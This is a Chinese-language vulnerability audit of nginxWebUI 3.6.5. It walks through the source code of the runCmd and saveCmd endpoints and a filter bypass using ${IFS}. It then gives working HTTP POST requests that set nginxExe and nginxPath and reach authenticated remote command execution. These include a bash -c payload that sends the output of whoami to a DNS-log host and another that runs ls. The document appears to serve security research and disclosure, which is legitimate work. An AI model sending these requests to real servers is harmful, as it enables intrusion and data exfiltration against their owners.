## 1\. 简介

版本 nginxWebUI3.6.5 系统 linux  
官网<https://www.nginxwebui.cn/>

## 2\. 审计过程

首先在com.cym.controller.adminPage#runCmd为命令执行的方法  
![](./img/3968871805166758058.png)

但是其中有一个校验，在下方图中，就是校验的位置  
![](./img/7302042898234965473.png)

跟进校验代码如下：  
![](./img/2636273811270457594.png)

在下方代码中，最终进行判断传入的cmd是否与系统中nginxExe参数 -c nginxPath参数值相同，如果相同才可以执行命令

    
    
    private boolean isAvailableCmd(String cmd) {
        String nginxPath = ToolUtils.handleConf(this.settingService.get("nginxPath"));
        this.settingService.set("nginxPath", nginxPath);
        String nginxExe = ToolUtils.handleConf(this.settingService.get("nginxExe"));
        this.settingService.set("nginxExe", nginxExe);
        String nginxDir = ToolUtils.handleConf(this.settingService.get("nginxDir"));
        this.settingService.set("nginxDir", nginxDir);
        byte var6 = -1;
        switch(cmd.hashCode()) {
        case -1740009377:
            if (cmd.equals("net stop nginx")) {
                var6 = 4;
            }
            break;
        case -648492175:
            if (cmd.equals("service nginx start")) {
                var6 = 6;
            }
            break;
        case -71312295:
            if (cmd.equals("net start nginx")) {
                var6 = 7;
            }
            break;
        case -23621360:
            if (cmd.equals("systemctl stop nginx")) {
                var6 = 2;
            }
            break;
        case 1171976517:
            if (cmd.equals("taskkill /f /im nginx.exe")) {
                var6 = 1;
            }
            break;
        case 1226007315:
            if (cmd.equals("service nginx stop")) {
                var6 = 3;
            }
            break;
        case 1597108680:
            if (cmd.equals("systemctl start nginx")) {
                var6 = 5;
            }
            break;
        case 1875609800:
            if (cmd.equals("pkill nginx")) {
                var6 = 0;
            }
        }
    
        switch(var6) {
        case 0:
            return true;
        case 1:
            return true;
        case 2:
            return true;
        case 3:
            return true;
        case 4:
            return true;
        case 5:
            return true;
        case 6:
            return true;
        case 7:
            return true;
        default:
            String dir = "";
            if (StrUtil.isNotEmpty(this.settingService.get("nginxDir"))) {
                dir = " -p " + this.settingService.get("nginxDir");
            }
    
            if (cmd.equals(this.settingService.get("nginxExe") + " -s stop" + dir)) {
                return true;
            } else {
                return cmd.equals(this.settingService.get("nginxExe") + " -c " + this.settingService.get("nginxPath") + dir);
            }
        }
    }
    

所以这里的思路就是，将nginxExe以及nginxPath进行设置。  
通过查找，看下图，发现com.cym.controller.adminPage#saveCmd方法能对nginxExe以及nginxPath进行设置  
![](./img/8345143118883431911.png)

但是在可以看见在其方法中有ToolUtils.handlePath(nginxPath);等方法调用，该方法主要对传入的参数进行过滤  
看下图则为过滤处，假设传入&等都会被删掉。而且传入空格也会被删除。  
![](./img/1835907851732038724.png)

#### 绕过思路

这里利用linux的特性${IFS}绕过，${IFS}会被当做空格  
![](./img/5185695041161004003.png)  
绕过思路有了，现在还可以根据一个特性来执行命令  
在Unix或Linux系统中 bash -c 选项用于执行一条命令  
bash -c "command"  
在最开始那个isAvailableCmd方法校验可以看到，外部传参的cmd必须和里面的内容一样  
所以先将nginxExe以及nginxPath进行设置。比如设置为 ping${IFS}xxxx.dnslog.xxx -c 1  
先登录  
![](./img/416182042672513175.png)

发包

    
    
    POST /adminPage/conf/saveCmd HTTP/1.1
    Host: xxxxx
    xxxxxxxxx太长了不写了xxxxxx
    
    nginxExe=ping${IFS}yxxxx.dnslog.pw&nginxPath=1
    

![](./img/3085337306530815551.png)

    
    
    POST /adminPage/conf/runCmd HTTP/1.1
    Host: xxxxxx
    
    
    cmd=ping${IFS}xxxx.dnslog.pw -c 1
    

![](./img/1303143290060778278.png)  
此时在校验这里肯定为true

![](./img/5388531999356003358.png)  
最后进行命令执行

![](./img/4913253294196766921.png)

![](./img/7952095391301761642.png)  
当然也可以执行系统命令，利用bash -c "命令" 来执行一条简单的命令  
首先将nginxExe以及nginxPath进行设置

    
    
    POST /adminPage/conf/saveCmd HTTP/1.1
    Host: xxx
    
    
    nginxExe=bash${IFS}&nginxPath=ls
    
    
    
    POST /adminPage/conf/runCmd HTTP/1.1
    Host: xxxx
    
    cmd=bash${IFS} -c ls
    

#### 空格绕过

在前面中可以发现，其实在修复了3.4.8版本之后应该是加入了过滤相关的，没细看之前的版本  
而在runCmd方法中，找到了一个可以直接使用set来将值设置进去的操作

![](./img/4009621400472707070.png)  
直接设置即可，依次发两个包，主要针对nginxExe以及nginxPath的设置

    
    
    POST /adminPage/conf/runCmd HTTP/1.1
    Host: xxxxx
    
    type=nginxExe&cmd=bash
    
    
    
    POST /adminPage/conf/runCmd HTTP/1.1
    Host: xxxxxx
    
    type=nginxPath&cmd=%22ping `whoami`.xxxx.dnslog.pw%22
    

最后在进行单个给cmd传参也是可以进行执行命令，在这里执行命令的好处就是可以绕过空格

    
    
    POST /adminPage/conf/runCmd HTTP/1.1
    Host: xxxxx
    
    cmd=bash -c %22ping `whoami`.xxxxx.dnslog.pw%22
    

![](./img/6608387686017483771.png)

